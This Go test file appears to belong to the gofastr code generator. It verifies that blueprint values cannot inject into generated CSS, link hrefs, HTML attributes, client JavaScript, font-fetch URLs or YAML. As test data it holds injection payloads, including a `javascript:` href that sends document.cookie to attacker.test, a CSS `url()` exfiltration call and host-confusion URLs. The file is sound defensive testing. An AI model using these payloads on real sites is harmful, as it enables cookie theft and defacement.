package main

import (
	"strconv"
	"strings"
	"testing"

	"github.com/DonaldMurillo/gofastr/core-ui/style"
	"github.com/DonaldMurillo/gofastr/framework"
	"github.com/DonaldMurillo/gofastr/framework/ui"
)

// Property family: no blueprint string may escape the NON-Go output context it
// is emitted into.
//
// emitter_quoting_security_test.go + blueprint_emitter_injection_test.go cover the
// GO context (literal / identifier / comment), and assertBlueprintGoParses is now
// the emitter-side backstop for it. Neither says anything about the contexts the
// emitted Go then *produces at runtime*: CSS custom properties, an <a href>, or
// (via `gofastr pack`) YAML. A value can be a perfectly well-formed Go string
// literal and still break out of the CSS declaration or the anchor scheme that
// literal is fed into, so the Go-side gate cannot see any of the three below.
//
// Threat model is the same one the sibling files state: a blueprint is
// developer-authored YAML OR agent-transcribed text (the documented workflow has
// an agent authoring gofastr.yml from natural-language requirements). It is NOT
// request-borne; no end user reaches these fields.

func bpTheme(light, dark map[string]string) Blueprint {
	return Blueprint{
		App: BlueprintApp{
			Name: "app", Module: "local/app",
			Theme: light, ThemeDark: dark,
		},
		Entities: []framework.EntityDeclaration{{
			Name:   "tickets",
			Fields: []framework.FieldDeclaration{{Name: "title", Type: "string"}},
		}},
		Screens: []BlueprintScreen{{Name: "home", Route: "/", Type: "page"}},
	}
}

// Property: a theme token value must not terminate the CSS declaration it is
// emitted into.
//
// Surfaces the property holds at, all reached from `app.theme`:
//   - theme.Colors.<Token>.Value      → `:root { --color-<t>: <v>; }`
//   - theme.DarkColors[<token>]       → `:root[data-color-scheme="dark"] { … }`
//     and the `@media (prefers-color-scheme: dark)` copy of it
//   - theme.Fonts.Body/Heading.Value  → `--font-body: '<family>', …`  (GUARDED:
//     blueprintFontFamilyName allow-lists it; the control case below)
//
// core-ui/style already owns this exact property: cssDeclBreakers + validateColorValue
// reject `;` `}` `{` `/*` `*/` `<` `>` `\` newline and `url(`. But that validation
// only runs through ApplyTokens (the `gofastr theme` setter path). The blueprint
// emitter writes `theme.Colors.X.Value = %q` and `theme.DarkColors = map[...]{…}`
// as DIRECT STRUCT ASSIGNMENTS, which bypass every setter, and validateBlueprint
// checks only the theme KEY (blueprintThemeColorPath), never the value.
//
// The font sibling got the guard in the 2026-08-04 pass
// (TestFontFamilyCannotInjectCSS); the color values beside it did not.
//
// Impact: the value lands in the app-wide stylesheet the UI host serves at
// /app.css (framework/uihost AppCSSFor) and in the admin battery's /css. `}`
// closes :root and appends rules of the author's choosing; `url(` is an outbound
// fetch on every page load. Served as text/css, so this is CSS injection
// (defacement + exfiltration via url()/attribute selectors), not script.
func TestThemeValueCannotInjectCSS(t *testing.T) {
	// One shape per way out of a custom-property declaration.
	payloads := map[string]string{
		"decl-break":  `#fff; } body { display:none } :root{ --x:1`,
		"url-fetch":   `#fff; background-image: url(https://attacker.test/exfil)`,
		"comment":     `#fff /* } body{display:none} /*`,
		"style-close": `#fff</style><script>PWN()</script>`,
		"newline":     "#fff;\n}\nbody{display:none}\n:root{--x:1",
	}
	sites := []struct {
		site string
		mut  func(*Blueprint, string)
	}{
		{"app.theme.primary", func(b *Blueprint, v string) { b.App.Theme = map[string]string{"primary": v} }},
		{"app.theme.dark.primary", func(b *Blueprint, v string) {
			b.App.Theme = map[string]string{"primary": "#fff"}
			b.App.ThemeDark = map[string]string{"primary": v}
		}},
		// Control: the same blueprint block, the guarded sibling field.
		{"app.theme.font_body", func(b *Blueprint, v string) { b.App.Theme = map[string]string{"font_body": v} }},
	}
	for label, payload := range payloads {
		for _, tc := range sites {
			t.Run(tc.site+"/"+label, func(t *testing.T) {
				bp := bpTheme(nil, nil)
				tc.mut(&bp, payload)
				if err := validateBlueprint(bp); err != nil {
					return // rejected at the boundary
				}
				files, err := renderBlueprintFiles(bp)
				if err != nil {
					return // emitter refused
				}
				var appGo string
				for _, f := range files {
					if f.name == "app.go" {
						appGo = f.content
					}
				}
				// The emitted assignment is what the generated app runs; replay it
				// against the same style API so the assertion is on the CSS the app
				// would serve, not on the Go text.
				th := style.DefaultTheme()
				switch tc.site {
				case "app.theme.primary":
					th.Colors.Primary.Value = payload
				case "app.theme.dark.primary":
					th.DarkColors = map[string]string{"primary": payload}
				case "app.theme.font_body":
					body, _ := blueprintFontStacks(bp.App.Theme)
					if body == "" {
						return
					}
					th.Fonts.Body.Value = body
				}
				css := th.CSSCustomProperties()
				// A raw newline in the value is itself the escape, and it does not
				// survive the per-line scan below; check the whole sheet for it.
				if strings.Contains(payload, "\n") && strings.Contains(css, payload) {
					t.Fatalf("SECURITY: [css-injection] %s: %q reached the stylesheet with its raw newlines intact\n  app.go: %s",
						tc.site, payload, firstLineWith(appGo, "Value = ", "DarkColors"))
				}
				for _, breaker := range []string{";", "}", "{", "/*", "*/", "<", ">", "\\", "url("} {
					line, ok := cssDeclLineFor(css, payload, breaker)
					if !ok {
						continue
					}
					t.Fatalf("SECURITY: [css-injection] %s: %q escaped its CSS declaration via %q\n  css:    %s\n  app.go: %s",
						tc.site, payload, breaker, line, firstLineWith(appGo, "Value = ", "DarkColors"))
				}
			})
		}
	}
}

// Guards TestThemeValueCannotInjectCSS against going vacuous: that test treats
// "validateBlueprint rejected it" as a pass, so a guard that rejected EVERY
// theme value would look identical. style.ValidateColorValue is the shared
// grammar (exported from core-ui/style for this caller rather than copied into
// the generator), and these are the shapes real blueprints use.
func TestThemeAcceptsRealColorValues(t *testing.T) {
	for _, v := range []string{"#2563EB", "#fff", "oklch(0.82 0.155 78)", "rgba(0, 0, 0, 0.5)", "var(--color-primary)"} {
		bp := bpTheme(map[string]string{"primary": v}, map[string]string{"primary": v})
		if err := validateBlueprint(bp); err != nil {
			t.Errorf("theme value %q rejected but is a legitimate color: %v", v, err)
			continue
		}
		if note := blueprintUnsafeColorNote("primary", v); note != "" {
			t.Errorf("theme value %q dropped by the emitter backstop: %s", v, note)
		}
	}
}

// The emitter is reachable without validateBlueprint (loadBlueprintPath's
// validate=false directory pass, a hand-built Blueprint), so the drop backstop
// carries the property on its own, and its generated comment must not itself
// become an escape.
func TestEmitterDropsUnsafeThemeColor(t *testing.T) {
	note := blueprintUnsafeColorNote("primary", "#fff; } body{display:none} /* */")
	if note == "" {
		t.Fatal("emitter kept a declaration-breaking color value")
	}
	if strings.Contains(note, "*/") || strings.Contains(note, "/*") || strings.Count(note, "\n") != 1 {
		t.Fatalf("drop note can escape its own Go comment: %q", note)
	}
	// The dropped value must not be echoed back into the generated source.
	if strings.Contains(note, "display:none") {
		t.Fatalf("drop note echoes the rejected value: %q", note)
	}
}

// cssDeclLineFor finds the emitted declaration carrying the payload and reports
// whether the payload put a declaration-breaking sequence inside it.
func cssDeclLineFor(css, payload, breaker string) (string, bool) {
	needle := payload
	if i := strings.IndexAny(payload, ";}{\n"); i > 0 {
		needle = payload[:i]
	}
	for _, line := range strings.Split(css, "\n") {
		if !strings.Contains(line, needle) || !strings.Contains(line, "--") {
			continue
		}
		// Strip the token name so `--color-primary` itself is not the "--" match.
		_, value, ok := strings.Cut(line, ":")
		if !ok {
			continue
		}
		value = strings.TrimSuffix(strings.TrimSpace(value), ";")
		if strings.Contains(value, breaker) {
			return strings.TrimSpace(line), true
		}
	}
	return "", false
}

func firstLineWith(s string, needles ...string) string {
	for _, line := range strings.Split(s, "\n") {
		for _, n := range needles {
			if strings.Contains(line, n) {
				return strings.TrimSpace(line)
			}
		}
	}
	return "(not found)"
}

// Property: every blueprint field that reaches an <a href> allow-lists the URL
// scheme.
//
// Surfaces, and which of them hold the property today:
//   - block link_button `href`          → ui.LinkButton:   GUARDED (isUnsafeScheme)
//   - block hero `cta_href`/`secondary_href` → ui.LinkButton:  GUARDED
//   - block pricing plan `cta_href`     → ui.PricingCard → LinkButton:  GUARDED
//   - block type:link `href`            → html.Link → setURLAttr(urlsafe.Anchor):  GUARDED
//   - node-renderer props `href`        → html.Link/LinkHTML → setURLAttr:  GUARDED
//   - nav item `href`                   → ui.SidebarItem → safeURL:  GUARDED
//   - login_form  props `register_href` → hand-rolled <a> inside render.Raw:  UNGUARDED
//   - signup_form props `login_href`    → same builder:  UNGUARDED
//
// blueprintAuthFormExpr builds the card footer as
//
//	`<a href="` + htmlEscapeJSString(footerHref) + `">` + … + `</a>`
//
// and hands it to render.Raw. htmlEscapeJSString escapes & < > " ', enough to
// stay inside the attribute, and nothing at all against the SCHEME, which is the
// property every sibling anchor sink in the repo enforces. render.Raw is what
// takes the value around core-ui/html's setURLAttr, the layer whose doc comment
// says it is "the lowest layer that renders a caller-supplied URL, so it is
// where the guard belongs".
//
// Impact: the generated login and signup screens ship
// `<a href="javascript:…">Create an account</a>`: script execution in the
// visitor's session on the app's own origin, on the two screens where a
// credential prompt already is.
func TestAuthFormHrefRejectsBadScheme(t *testing.T) {
	unsafe := []string{
		"javascript:fetch('//attacker.test/'+document.cookie)",
		"JavaScript:PWN()",                    // case
		"java\tscript:PWN()",                  // embedded control byte
		"data:text/html,<script>1<\\/script>", // data: document
		"vbscript:PWN()",
	}
	sites := []struct {
		site string
		expr func(string) string
	}{
		{"login_form.register_href", func(v string) string {
			return renderBlueprintLoginFormExpr(BlueprintBlock{
				Kind: "login_form", Props: map[string]any{"register_href": v},
			})
		}},
		{"signup_form.login_href", func(v string) string {
			return renderBlueprintSignupFormExpr(BlueprintBlock{
				Kind: "signup_form", Props: map[string]any{"login_href": v},
			})
		}},
		// Controls: the guarded siblings. ui.LinkButton refuses the scheme, so the
		// blueprint may legitimately emit the value and the check lands downstream.
		{"link_button.href", func(v string) string {
			expr, _ := renderBlueprintCatalogBlock(Blueprint{}, BlueprintScreen{Name: "home"}, BlueprintBlock{
				Kind: "link_button", Props: map[string]any{"label": "Go", "href": v},
			}, nil, nil, "")
			return expr
		}},
	}
	for _, tc := range sites {
		for _, href := range unsafe {
			t.Run(tc.site, func(t *testing.T) {
				expr := tc.expr(href)
				if strings.Contains(expr, "render.Raw(\"<a href=") {
					t.Fatalf("SECURITY: [url-scheme] %s: %q reaches a render.Raw <a href> with no scheme allow-list (every sibling anchor sink goes through urlsafe.Anchor / isUnsafeScheme)\n  %s",
						tc.site, href, expr)
				}
				// Not-a-raw-anchor is necessary but not sufficient: the value has
				// to land in a constructor that actually runs the guard. Naming
				// them here is what stops a future refactor from moving the href
				// into some third emission shape and passing on the negative.
				for _, guarded := range []string{"ui.Link(ui.LinkConfig{Href:", "ui.LinkButton(ui.LinkButtonConfig{", "html.Link(html.LinkConfig{Href:"} {
					if strings.Contains(expr, guarded) {
						return
					}
				}
				t.Fatalf("SECURITY: [url-scheme] %s: %q is emitted through no known guarded anchor constructor\n  %s", tc.site, href, expr)
			})
		}
	}
}

// The constructor the auth footer now names has to hold up its end. This runs
// ui.Link on the same payloads and reads the rendered anchor, so the pass above
// is anchored to real rendered output rather than to a string match on emitted
// Go. It is the only end-to-end half of the property available in this package.
func TestUILinkNeutralizesBadScheme(t *testing.T) {
	for _, href := range []string{
		"javascript:fetch('//attacker.test/'+document.cookie)",
		"JavaScript:PWN()",
		"java\tscript:PWN()",
		"data:text/html,<script>1</script>",
		"vbscript:PWN()",
	} {
		got := string(ui.Link(ui.LinkConfig{Href: href, Text: "Create an account"}))
		low := strings.ToLower(got)
		for _, bad := range []string{"javascript:", "vbscript:", "data:text/html"} {
			if strings.Contains(low, bad) {
				t.Errorf("SECURITY: [url-scheme] ui.Link rendered %q: %s", href, got)
			}
		}
	}
	// Control: a legitimate href survives, so the guard does not blank every
	// anchor the auth screens emit.
	if !strings.Contains(string(ui.Link(ui.LinkConfig{Href: "/register", Text: "Create an account"})), `href="/register"`) {
		t.Error("ui.Link dropped a safe relative href")
	}
}

// Property: a value interpolated into the generator's hand-built HTML is
// escaped at EVERY interpolation, not most of them.
//
// blueprintEntityFormExpr built `name="` + e(field.Name) + `" id="` + fieldID,
// where fieldID = "field-" + field.Name; the same value, escaped in one
// attribute and raw in the next, three tokens apart. validateBlueprint requires
// field.Name to produce a Go identifier, so no blueprint reaches this today;
// the test calls the emitter directly because the asymmetry, not its current
// reachability, is the bug. `For:` stays raw on purpose: ui.FormField's
// renderer escapes it, and pre-escaping would double-escape.
func TestFormFieldIDIsEscaped(t *testing.T) {
	decl := framework.EntityDeclaration{
		Name:   "tickets",
		Fields: []framework.FieldDeclaration{{Name: `x" onfocus=PWN() z`, Type: "string"}},
	}
	expr := blueprintEntityFormExpr(
		BlueprintScreen{Name: "home"},
		BlueprintBlock{Kind: "entity_form", Entity: "tickets"},
		nil, map[string]framework.EntityDeclaration{"tickets": decl}, "/api",
	)
	if strings.Contains(expr, `id=\"field-x\" onfocus=`) {
		t.Fatalf("SECURITY: [attr-escape] field name broke out of the id attribute\n  %s", expr)
	}
}

// Property: an enum-like config value the emitter switches on must be
// validated, not silently defaulted.
//
// blueprintScreenLayoutExpr maps anything that is not "marketing" to appLayout,
// so `layout: markting` renders a public marketing page in the authenticated app
// shell. Access gating is `access:`, so this is wrong chrome rather than a gate
// bypass, but it is a setting the author believes they set.
func TestScreenLayoutMustBeKnown(t *testing.T) {
	for _, layout := range []string{"markting", "App", "admin", " marketing"} {
		bp := bpTheme(nil, nil)
		bp.Screens[0].Layout = layout
		if err := validateBlueprint(bp); err == nil {
			t.Errorf("screen layout %q accepted; it renders as %s", layout, blueprintScreenLayoutExpr(bp.Screens[0], bp))
		}
	}
	for _, layout := range []string{"", "app", "marketing"} {
		bp := bpTheme(nil, nil)
		bp.Screens[0].Layout = layout
		if err := validateBlueprint(bp); err != nil {
			t.Errorf("screen layout %q rejected but is documented: %v", layout, err)
		}
	}
}

// Property: a name interpolated into the generated client.js never lands in a
// position where a metacharacter would be parsed as JS.
//
// client.go gets format.Source and the blueprint tree gets
// assertBlueprintGoParses; .js and .d.ts get no syntax gate at all (no JS parser
// in the Go stdlib, and third-party deps are not an option here), so the two
// emission sites in the executable .js carry the property themselves: a quoted
// object key and this[...] bracket access. f.Wire is toCamelJSON(field name) and
// toCamelCase only splits on "_ - space", so it is not an identifier by
// construction.
//
// Provenance is the developer's own entities/*.go (packReadEntities → astString,
// no identifier check), so this is hardening, not a privilege boundary; anyone
// who can edit that file can already run code in the project.
func TestClientJSQuotesEmittedNames(t *testing.T) {
	decl := framework.EntityDeclaration{
		Name:  "posts",
		Table: `posts"]=1;PWN();x["y`,
		Fields: []framework.FieldDeclaration{
			{Name: "title", Type: "string"},
			{Name: `a": 1, evil: PWN(), b: "`, Type: "string"},
		},
	}
	ent, err := buildCLIEntity(decl, []string{"list"})
	if err != nil {
		t.Skipf("buildCLIEntity rejected the fixture upstream (also fine): %v", err)
	}
	var js, dts strings.Builder
	writeJSEntity(&js, &dts, decl, ent)
	got := js.String()
	// Every emitted name must sit inside a string literal. A bare one shows up
	// as `  <name>:` at the head of a line.
	for _, line := range strings.Split(got, "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" || strings.HasPrefix(trimmed, "/*") || strings.HasPrefix(trimmed, "/**") || strings.HasPrefix(trimmed, "*") {
			continue
		}
		if strings.HasPrefix(trimmed, "export const") || strings.HasPrefix(trimmed, "});") {
			continue
		}
		if !strings.HasPrefix(trimmed, `"`) {
			t.Errorf("SECURITY: [js-injection] unquoted name in emitted client.js: %q", line)
		}
	}
	// The resource-property site is a JS statement position, the sharper of the
	// two; it must use this[...] rather than this.<name>.
	prop := jsResourceProp(ent)
	stmt := "    this[" + strconv.Quote(prop) + "] = new Resource(this, " + strconv.Quote(ent.Table) + ");"
	if strings.Contains(stmt, "this."+prop) {
		t.Errorf("SECURITY: [js-injection] resource property emitted as a bare this.<name>: %s", stmt)
	}
}

// Property: the only host generation will fetch a font binary from is the one
// the doc comment names.
//
// blueprintFirstWoff2URL's result goes straight to blueprintFontHTTPGet, so the
// fetch target comes from the css2 RESPONSE BODY. The comment said gstatic; the
// code only looked for ".woff2" anywhere in the string. No blueprint reaches it
// (the family param is reduced to [A-Za-z0-9 _-]), so this pins the contract.
func TestFontFetchOnlyTrustsGstatic(t *testing.T) {
	bad := []string{
		"https://attacker.test/x.woff2",
		"https://fonts.gstatic.com.attacker.test/x.woff2", // suffix confusion
		"http://fonts.gstatic.com/s/x.woff2",              // downgraded scheme
		"https://attacker.test/collect?f=.woff2",          // metachar in query
		"https://fonts.gstatic.com@attacker.test/x.woff2", // userinfo host confusion
	}
	for _, u := range bad {
		css := "/* latin */\n@font-face { src: url(" + u + ") format('woff2'); }"
		if got := blueprintFirstWoff2URL(css); got != "" {
			t.Errorf("SECURITY: [ssrf] font fetch accepted %q (returned %q)", u, got)
		}
	}
	// Control: the real thing still resolves, or fonts stop working.
	real := "https://fonts.gstatic.com/s/hankengrotesk/v8/abc.woff2"
	if got := blueprintFirstWoff2URL("/* latin */\n@font-face { src: url(" + real + ") format('woff2'); }"); got != real {
		t.Errorf("legitimate gstatic woff2 rejected: got %q", got)
	}
}

// Property: `gofastr pack` must emit a scalar that re-parses as the same single
// scalar; encodeBlueprintYAML is documented as the exact inverse of
// decodeBlueprint (see the banner comment in pack.go).
//
// Surfaces: every list-of-strings the writer emits as a YAML FLOW list via
// writeFlowList: entity field `values:` (enums), `search_fields:`, entity_list
// `fields:` / `filters:`, `pagination.cursor_fields`, index `columns:`, and any
// scalar list a future construct adds. Of those, `search_fields` / `fields` /
// `filters` / `columns` are re-checked against the declaration on decode, so a
// smuggled sibling there fails the re-parse loudly rather than widening the
// surface. `values:` (the enum value set) is the one with no such check, hence
// the assertion below.
//
// needsQuote decides whether to quote a scalar. It checks `,` only as the FIRST
// byte (`strings.ContainsAny(s[:1], "…,…")`), so an interior comma is emitted
// bare, and bare is exactly where a comma is a flow-list ITEM SEPARATOR. One
// item becomes two on re-parse.
//
// This is the reverse trust boundary: `pack` reads a generated app's Go source
// and writes the YAML you regenerate from. A list element gains a sibling that
// the app never declared, and the regenerated blueprint then validates it
// happily; `search_fields` and `filters:` are the sharp ones, since both widen
// the query surface of the generated API.
func TestPackYAMLListItemStaysOneItem(t *testing.T) {
	// One shape per YAML flow-list metacharacter. The comma is the live one.
	for _, payload := range []string{
		"open,closed",   // flow-list item separator
		"open]  x",      // flow terminator
		"open}  x",      // mapping terminator
		"open: closed",  // key/value separator
		"open #comment", // comment introducer
	} {
		bp := Blueprint{
			App: BlueprintApp{Name: "app", Module: "local/app"},
			Entities: []framework.EntityDeclaration{{
				Name: "tickets",
				Fields: []framework.FieldDeclaration{
					{Name: "title", Type: "string"},
					{Name: "status", Type: "enum", Values: []string{payload, "closed"}},
				},
			}},
		}
		yml, err := encodeBlueprintYAML(bp)
		if err != nil {
			t.Errorf("SECURITY: [yaml-injection] %q: pack refused a value-only hostile blueprint: %v", payload, err)
			continue
		}
		back, err := decodeBlueprintString(yml)
		if err != nil {
			t.Errorf("SECURITY: [yaml-injection] %q: pack emitted YAML that no longer parses: %v\n%s", payload, err, yml)
			continue
		}
		if got := back.Entities[0].Fields[1].Values; len(got) != 2 || got[0] != payload {
			t.Errorf("SECURITY: [yaml-injection] field.values %q round-tripped as %#v — pack invented list items\n%s", payload, got, yml)
		}
	}
	// The predicate itself: flow indicators are special ANYWHERE inside a
	// scalar, not only as its first byte, because writeFlowList emits scalars
	// into `[a, b]`. Testing only s[:1] was the bug.
	for _, s := range []string{"open,closed", "a[b", "a]b", "a{b", "a}b"} {
		if !needsQuote(s) {
			t.Errorf("needsQuote(%q) = false — an interior flow indicator is emitted bare", s)
		}
	}
	// Control: an ordinary scalar still emits bare, so pack output stays close
	// to hand-written YAML.
	if needsQuote("open") || needsQuote("in_progress") {
		t.Error("needsQuote now quotes plain scalars — pack output would churn")
	}
}
